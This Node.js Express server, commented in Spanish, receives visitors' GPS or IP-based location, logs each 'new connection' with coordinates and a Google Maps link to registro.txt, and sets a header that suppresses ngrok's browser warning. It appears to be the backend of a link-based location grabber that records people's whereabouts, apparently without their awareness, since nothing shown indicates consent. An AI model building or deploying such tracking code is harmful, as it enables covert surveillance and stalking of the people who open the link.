const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs'); 

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());

app.use((req, res, next) => {
    res.setHeader('ngrok-skip-browser-warning', 'true');
    next();
});

app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/ubicacion', (req, res) => {
    const { plataforma, tipo, latitud, longitud, precision, ciudad, pais } = req.body;
    const fecha = new Date().toLocaleString(); 
    
    let textoLog = `\n================ [ NUEVA CONEXIÓN - ${fecha} ] ================\n`;
    textoLog += `Dispositivo: ${plataforma}\n`;
    textoLog += `Método de rastreo: ${tipo}\n`;
    
    if (tipo === 'GPS (Preciso)') {
        textoLog += `Coordenadas: Latitud: ${latitud}, Longitud: ${longitud}\n`;
        textoLog += `Precisión: +/- ${precision} metros\n`;
        textoLog += "Enlace a mapa: https://www.google.com/maps/place/" + latitud + "," + longitud + "\n";
    } else {
        textoLog += `Ubicación aproximada por IP: ${ciudad || 'Desconocida'}, ${pais || 'Desconocido'}\n`;
        textoLog += `Coordenadas estimadas: Latitud: ${latitud}, Longitud: ${longitud}\n`;
        textoLog += "Enlace aproximado: https://www.google.com/maps/place/" + latitud + "," + longitud + "\n";
    }
    textoLog += `====================================================\n`;
    
    console.log(textoLog);
    
    fs.appendFile(path.join(__dirname, 'registro.txt'), textoLog, (err) => {
        if (err) console.error(err);
    });

    res.json({ status: "success" });
});

app.listen(PORT, () => {
    console.log(`Servidor de pruebas corriendo en http://localhost:${PORT}`);
});
